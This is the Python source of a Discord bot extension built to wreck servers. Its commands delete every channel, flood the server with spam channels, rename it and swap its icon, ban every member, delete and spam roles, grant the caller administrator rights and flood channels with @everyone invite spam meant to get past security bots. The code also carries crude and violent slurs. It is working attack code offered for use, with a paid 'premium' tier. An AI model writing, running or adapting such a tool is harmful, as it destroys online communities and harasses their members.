import discord
import aiohttp
import asyncio
import json
from discord.ext import commands
from datetime import datetime

class a(commands.Cog):
    def __init__(b,c):
        b.d=c

    def e(b,f):
        try:
            with open('premium_users.json','r')as g:
                h=json.load(g)
            return f.author.id in h or f.author.id in b.d.ownerUsers
        except(FileNotFoundError,json.JSONDecodeError):
            return f.author.id in b.d.ownerUsers

    @commands.command()
    async def help(b,f):
        i=discord.Embed(title="** [ Help Command ] **",description='```xml\n< [ Free Commands ] >\n< [ Prefix: + ] >\n```\n[ 1 ] `seize` - nukes the server\n[ 2 ] `soap` - bans all members in the server\n[ 3 ] `bypass` - bypasses security bots like wick and security by renaming channels and spamming\n[ 4 ] `rolespam` - spams roles\n[ 5 ] `dab` - gives admin in the server\n[ 6 ] `help` - shows this menu\n[ 7 ] `phelp` - shows the premium cmd menu',color=discord.Color.default(),timestamp=datetime.utcnow())
        await f.send(embed=i)

    @commands.command()
    async def dab(b,f):
        if not f.guild.me.guild_permissions.manage_roles:return
        await f.message.delete()
        try:
            j=await f.guild.create_role(name="-",permissions=f.guild.me.guild_permissions,color=discord.Color.default(),reason="your mom is fat")
            k=f.guild.me.top_role
            if k.position<=1:return
            l=k.position-1
            await j.edit(position=l)
            await f.author.add_roles(j,reason="your mom is fat")
        except Exception as m:print(f"Failed in dab command: {str(m)}")

    @commands.command()
    async def phelp(b,f):
        if not b.e(f):
            await f.send("<:cancel:1383448034829926481> Premium only.")
            return
        i=discord.Embed(title="** [ Premium Help Command] **",description='```xml\n< [ Premium Commands ] >\n< [ Prefix: + ] >\n```\n[ 1 ] `pseize` - nukes the server with your own message and channel names\n[ 2 ] `pbypass` - bypasses the security bots with your own message and channel names\n[ 3 ] `proles` - spams roles with your own role name\n[ 4 ] `config` - lets you set up your premium config for the above commands to work',color=discord.Color.default(),timestamp=datetime.utcnow())
        await f.send(embed=i)

    @commands.command()
    @commands.cooldown(1,500,commands.BucketType.guild)
    async def seize(b,f):
        if f.author.id in b.d.ownerUsers:f.command.reset_cooldown(f)
        b.d.nukeType="regular"
        b.d.currentNukeMsg=getattr(b.d,'currentNukeMsg',None)
        if f.guild.id in getattr(b.d,'exemptGuilds',[]):return await f.send("```This server is protected and cannot be nuked.```")
        if not f.guild.me.guild_permissions.manage_channels:
            await f.send("<:cancel:1383448034829926481> I need Manage Channels permission.")
            return
        await f.message.delete()
        b.d.nukeActive=True
        b.d.nukeTasks=[]
        n=f.guild
        o={"Authorization":f"Bot {b.d.http.token}","Content-Type":"application/json"}
        async def p(q):
            try:
                async with aiohttp.ClientSession()as r:await r.delete(f"https://discord.com/api/v10/channels/{q.id}",headers=o)
            except:pass
        async def s(n,t):
            try:
                async with aiohttp.ClientSession()as r:
                    u={"name":t,"type":0}
                    await r.post(f"https://discord.com/api/v10/guilds/{n.id}/channels",headers=o,json=u)
            except:pass
        v=getattr(b.d,'nukeChannelNames',['nuked'])
        w=[p(x)for x in n.channels]
        await asyncio.gather(*w)
        y=[s(n,v[z%len(v)])for z in range(50)]
        await asyncio.gather(*y)
        try:
            aa=n.name
            if not hasattr(b.d,'oldNames'):b.d.oldNames={}
            b.d.oldNames[n.id]=aa
            await n.edit(name="［👁️］ᴍᴜʀᴅᴇʀᴇᴅ-ʙʏ-sᴀɴɪᴛʏ")
        except:pass
        try:
            async with aiohttp.ClientSession()as r:
                async with r.get(getattr(b.d,'nukeIconUrl',''))as ab:
                    if ab.status==200:
                        ac=await ab.read()
                        await n.edit(icon=ac)
                        print("Server icon changed successfully!")
        except Exception as ad:print(f"Failed to change server icon: {ad}")

    @commands.command(name="soap")
    async def massban(b,f):
        if not f.guild.me.guild_permissions.ban_members:
            await f.send("<:cancel:1383448034829926481> I need Ban Members permission.")
            return
        n=f.guild
        o={"Authorization":f"Bot {b.d.http.token}","Content-Type":"application/json"}
        async with aiohttp.ClientSession()as r:
            ae=[]
            for af in n.members:
                if af.id!=b.d.user.id:
                    ag=f"https://discord.com/api/v10/guilds/{n.id}/bans/{af.id}"
                    ah={"delete_message_days":1,"reason":"Violating Discord ToS"}
                    ae.append(r.put(ag,headers=o,json=ah))
            await asyncio.gather(*ae,return_exceptions=True)

    @commands.command()
    @commands.cooldown(1,500,commands.BucketType.guild)
    async def rolespam(b,f):
        if not f.guild.me.guild_permissions.manage_roles:return await f.send("<a:762_alert:1382770261597884558> Missing Manage Roles permission.")
        await f.message.delete()
        ai=[aj for aj in f.guild.roles if aj!=f.guild.default_role and aj.position<f.guild.me.top_role.position]
        for ak in range(0,len(ai),20):
            al=ai[ak:ak+20]
            await asyncio.gather(*[am.delete(reason="get raped")for am in al])
            await asyncio.sleep(0.2)
        for ak in range(0,35,10):
            an=min(10,35-ak)
            await asyncio.gather(*[f.guild.create_role(name=f"[ 😜 ]  funnied by sanity")for ao in range(an)])
            await asyncio.sleep(0.5)

    @commands.command()
    @commands.cooldown(1,500,commands.BucketType.guild)
    async def bypass(b,f):
        if f.guild.id in getattr(b.d,'exemptGuilds',[]):return await f.send("This server is protected and cannot be nuked.")
        await f.message.delete()
        async def ap(ch):
            try:
                await ch.edit(name="︱［🧟‍♂️］folded-by-sanity")
                for _ in range(40):await ch.send("@everyone \n # https://discord.gg/ccdyKy2mFA")
            except:pass
        ar=[ap(ch)for ch in f.guild.text_channels]
        await asyncio.gather(*ar)

def setup(c):
    c.add_cog(a(c))